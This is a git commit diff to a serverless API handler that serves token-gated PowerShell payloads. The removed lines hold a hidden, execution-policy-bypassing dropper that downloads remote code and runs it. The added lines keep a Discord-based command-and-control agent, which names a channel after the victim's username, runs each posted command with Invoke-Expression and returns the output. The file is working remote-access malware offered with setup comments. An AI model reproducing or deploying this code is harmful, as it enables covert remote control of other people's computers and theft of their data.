2a39ced564db8230a9bb626027cd69bbfa0b0627
Janis <janis10@klaer.eu>
2025-03-29 14:45:07 +0100

    Update index.js

--- api/index.js
+++ api/index.js
@@ -24,17 +24,16 @@ export default function handler(req, res) {
     }
     
     const token = tokenParts[1];
-    const VALID_TOKEN = process.env.VALID_TOKEN || "yyyyyy"; //Main script token
-    const VALID_TOKEN_1 = process.env.VALID_TOKEN_1 || "xxxxxx"; //Dropper token
+    const VALID_TOKEN = process.env.VALID_TOKEN || "yyyyyy"; //token
     
-    if (token === VALID_TOKEN_1) {
-      //change the URL to your Vercel project and your Dropper Token
-      const dropperScript = `Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command \`$r = Invoke-WebRequest https://xyz.vercel.app -Headers @{'Authorization'='Bearer xxxxxx'}; Invoke-Expression \`$r.Content" -WindowStyle Hidden`;
-      res.setHeader("Content-Type", "text/plain");
-      return res.status(200).send(dropperScript);
-    } else if (token === VALID_TOKEN) {
-      //replace $t, $c, $s, $categoryID with your Data
-      const powershellScript = `$t="Discord bot token";$c="discord channel ID";$s="discord Server ID";$categoryId="Discord category ID";function sndmsg{param($message);$w.Headers.Add("Content-Type","application/json");$j=@{"content"=$message}|ConvertTo-Json;$x=$w.UploadString($u,"POST",$j)};function createChannel{param($channelName);$createChannelUrl="https://discord.com/api/v10/guilds/$s/channels";$w.Headers.Add("Content-Type","application/json");$j=@{"name"=$channelName;"type"=0;"parent_id"=$categoryId}|ConvertTo-Json;$response=$w.UploadString($createChannelUrl,"POST",$j);$channel=$response|ConvertFrom-Json;return $channel.id};function deleteChannel{param($channelId);$deleteChannelUrl="https://discord.com/api/v10/channels/$channelId";$w.Headers.Add("Content-Type","application/json");$w.UploadString($deleteChannelUrl,"DELETE","")};$w=New-Object System.Net.WebClient;$w.Headers.Add("Authorization","Bot $t");trap{[void]$_;exit};try{$computerName=$env:COMPUTERNAME;$windowsUser=$env:USERNAME;$channelName="$windowsUser";$newChannelId=createChannel -channelName $channelName;$c=$newChannelId;while($true){$u="https://discord.com/api/v10/channels/$c/messages";$m=$w.DownloadString($u);$r=($m|ConvertFrom-Json)[0];if(-not $r.author.bot){$a=$r.timestamp;$m=$r.content;if($a -ne $p){$p=$a;try{$o=iex $m 2>&1|Out-String}catch{$o=$null};$l=$o -split "\`n";$s=0;$b=@();foreach($z in $l){$y=[System.Text.Encoding]::Unicode.GetByteCount($z);if(($s+$y)-gt 1900){sndmsg -message "\`\`\`\`\`\`$($b -join \`"\`n\`")\`\`\`\`\`\`";sleep 1;$s=0;$b=@()};$b+=$z;$s+=$y};if($b.Count-gt 0){sndmsg -message "\`\`\`\`\`\`$($b -join \`"\`n\`")\`\`\`\`\`\`"}}};Sleep 3}}finally{if($newChannelId){try{deleteChannel -channelId $newChannelId}catch{[void]$_}}}`;
+    if (token === VALID_TOKEN) {
+      //$c is the inital ChannelID not the one which listens to commands
+      const powershellScript = `
+      $t="Discord bot token";
+      $c="discord channel ID";
+      $s="discord Server ID";
+      $cid="Discord category ID";
+      function sndmsg{param($message);$w.Headers.Add("Content-Type","application/json");$j=@{"content"=$message}|ConvertTo-Json;$x=$w.UploadString($u,"POST",$j)};function createChannel{param($channelName);$createChannelUrl="https://discord.com/api/v10/guilds/$s/channels";$w.Headers.Add("Content-Type","application/json");$j=@{"name"=$channelName;"type"=0;"parent_id"=$cid}|ConvertTo-Json;$response=$w.UploadString($createChannelUrl,"POST",$j);$channel=$response|ConvertFrom-Json;return $channel.id};function deleteChannel{param($channelId);$deleteChannelUrl="https://discord.com/api/v10/channels/$channelId";$w.Headers.Add("Content-Type","application/json");$w.UploadString($deleteChannelUrl,"DELETE","")};$w=New-Object System.Net.WebClient;$w.Headers.Add("Authorization","Bot $t");trap{[void]$_;exit};try{$computerName=$env:COMPUTERNAME;$windowsUser=$env:USERNAME;$channelName="$windowsUser";$newChannelId=createChannel -channelName $channelName;$c=$newChannelId;while($true){$u="https://discord.com/api/v10/channels/$c/messages";$m=$w.DownloadString($u);$r=($m|ConvertFrom-Json)[0];if(-not $r.author.bot){$a=$r.timestamp;$m=$r.content;if($a -ne $p){$p=$a;try{$o=iex $m 2>&1|Out-String}catch{$o=$null};$l=$o -split "\`n";$s=0;$b=@();foreach($z in $l){$y=[System.Text.Encoding]::Unicode.GetByteCount($z);if(($s+$y)-gt 1900){sndmsg -message "\`\`\`\`\`\`$($b -join \`"\`n\`")\`\`\`\`\`\`";sleep 1;$s=0;$b=@()};$b+=$z;$s+=$y};if($b.Count-gt 0){sndmsg -message "\`\`\`\`\`\`$($b -join \`"\`n\`")\`\`\`\`\`\`"}}};Sleep 3}}finally{if($newChannelId){try{deleteChannel -channelId $newChannelId}catch{[void]$_}}}`;
       res.setHeader("Content-Type", "text/plain");
       return res.status(200).send(powershellScript);
     } else {
